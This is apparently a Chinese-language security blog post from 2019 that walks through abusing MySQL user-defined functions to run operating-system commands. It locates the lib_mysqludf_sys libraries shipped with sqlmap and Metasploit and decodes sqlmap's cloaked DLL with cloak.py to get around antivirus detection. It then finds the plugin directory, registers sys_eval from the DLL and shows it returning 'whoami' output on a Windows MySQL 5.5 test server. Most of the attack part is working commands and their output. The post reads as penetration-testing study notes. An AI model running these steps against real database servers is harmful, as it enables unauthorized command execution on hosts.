## MySQL UDF执行系统命令

2019-5-30



MySQL允许用户调用在共享库中的函数，这种函数叫做UDF(user defined functions)，即用户定义函数。

当然不是随便拉一个共享库过来，MySQL就能执行里面的函数。

关于UDF的编写，以及其他的细节，因为我时间的关系不在这里详细阐述，只记录一下如何利用



### 库文件

首先需要一个共享库/动态链接库。sqlmap自带可以执行系统命令的UDF库

系统为kali

```
# find / -name udf
/usr/share/golismero/tools/sqlmap/udf
# tree mysql
mysql
├── linux
│   ├── 32
│   │   └── lib_mysqludf_sys.so
│   └── 64
│       └── lib_mysqludf_sys.so
└── windows
    ├── 32
    │   └── lib_mysqludf_sys.dll
    └── 64
        └── lib_mysqludf_sys.dll

```

mysql文件夹中有Linux平台的和Windows平台的，并且都有32位和64位的版本 (这里的32位64位是对应MySQL的位数，版本不对会报错，在加载函数时提示无法打开)

网上看到有免杀相关的东西，这里kali自带的没有经过免杀处理

>但是sqlmap 中 自带 的shell 以及一些二进制文件，为了防止被误杀都经过异或方式编码，不能直接使用的。
>
>可以利用sqlmap 自带的解码工具cloak.py
>目录 sqlmap\extra\cloak\cloak.py 对 sqlmap\udf\mysql\windows\32\lib_mysqludf_sys.dll_ 解码后，再直接利用
>
>首先进入到 sqlmap\extra\cloak\cloak 目录下，执行命令：
>
>cloak.py -d -i D:\sqlmap\udf\mysql\windows\32\lib_mysqludf_sys.dll
>
>作者：回忆里的褶皱 
>来源：CSDN 
>原文：https://blog.csdn.net/x728999452/article/details/52413974 
>版权声明：本文为博主原创文章，转载请附上博文链接！
>
>



msf也带UDF库

```
# cd /usr/share/metasploit-framework/data/exploits/mysql/
# ls
lib_mysqludf_sys_32.dll  lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.dll  lib_mysqludf_sys_64.so
```

查看函数

```
# readelf -s lib_mysqludf_sys_64.so | grep FUNC
    20: 000000000000107a   110 FUNC    GLOBAL DEFAULT   11 sys_set
    21: 0000000000000da7     1 FUNC    GLOBAL DEFAULT   11 sys_eval_deinit
    22: 0000000000001178     0 FUNC    GLOBAL DEFAULT   12 _fini
    23: 000000000000101a    45 FUNC    GLOBAL DEFAULT   11 lib_mysqludf_sys_info
    24: 0000000000000ba0     0 FUNC    GLOBAL DEFAULT    9 _init
    26: 0000000000000dab     1 FUNC    GLOBAL DEFAULT   11 sys_bineval_deinit
    27: 0000000000001066    20 FUNC    GLOBAL DEFAULT   11 sys_exec
    29: 0000000000000da5     1 FUNC    GLOBAL DEFAULT   11 sys_get_deinit
    30: 0000000000000f2e    41 FUNC    GLOBAL DEFAULT   11 sys_eval_init
    31: 00000000000010f7    65 FUNC    GLOBAL DEFAULT   11 sys_get
    32: 0000000000000da4     1 FUNC    GLOBAL DEFAULT   11 lib_mysqludf_sys_info_dei
    33: 0000000000000fea    48 FUNC    GLOBAL DEFAULT   11 sys_get_init
    35: 0000000000000da6     1 FUNC    GLOBAL DEFAULT   11 sys_exec_deinit
    36: 0000000000000f80   106 FUNC    GLOBAL DEFAULT   11 sys_set_init
    37: 0000000000000da8     3 FUNC    GLOBAL DEFAULT   11 sys_bineval_init
    38: 0000000000000f57    41 FUNC    GLOBAL DEFAULT   11 sys_exec_init
    39: 0000000000001047    31 FUNC    GLOBAL DEFAULT   11 lib_mysqludf_sys_info_ini
    40: 0000000000000dac   154 FUNC    GLOBAL DEFAULT   11 sys_bineval
    41: 00000000000010e8    15 FUNC    GLOBAL DEFAULT   11 sys_set_deinit
    42: 0000000000000e46   232 FUNC    GLOBAL DEFAULT   11 sys_eval

```



### 加载并执行库文件中的UDF

在 5.1版本以后，UDF库文件必须要在MySQL安装目录下的lib\plugin文件夹下，需要确保plugin目录存在

可以使用命令定位文件夹

```
mysql> select @@plugin_dir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+
```



#### Windows

这里数据库的版本为Windows-MySQL 5.5

```
Server version: 5.5.53 MySQL Community Server (GPL)
```

因为没有plugin目录，这里为了演示直接手工创建文件夹并把文件复制过去...

```
 C:\Users\leaf\Desktop\PHPStudy_multiversion\MySQL\lib\plugin 的目录

2019/05/30  09:51    <DIR>          .
2019/05/30  09:51    <DIR>          ..
2015/01/15  00:59            11,264 udfdll.dll
```

sqlmap的共享库中有这么几个函数

>sys_eval，执行任意命令，并将输出返回。
> sys_exec，执行任意命令，并将退出码返回。
> sys_get，获取一个环境变量。
> sys_set，创建或修改一个环境变量。

创建函数（需要有mysql库的插入权限）

```
create function sys_eval returns string soname "udfdll.dll";
```

使用函数

```
mysql> select sys_eval("whoami");
+--------------------+
| sys_eval("whoami") |
+--------------------+
| leaf-pc\leaf       |
+--------------------+
1 row in set (0.34 sec)
```



删除函数

```
drop function sys_eval;
```



#### Linux

与Windows使用的过程大致相同

plugin文件夹默认在/usr/lib/mysql文件夹下，测试用的环境是Ubuntu 16.04，apt安装，自带一些插件

使用的是5.7.23，不知为何执行结果总是为NULL

### 扩展阅读

UDF编写和使用 <https://www.jianshu.com/p/10a980667819>

MySQL 利用UDF执行命令 <https://blog.csdn.net/x728999452/article/details/52413974>

UDF利用<https://osandamalith.com/2018/02/11/mysql-udf-exploitation/>

译文<https://xz.aliyun.com/t/2167?accounttraceid=85dbd2c9-8021-4125-bf50-c7be4b510695#toc-6>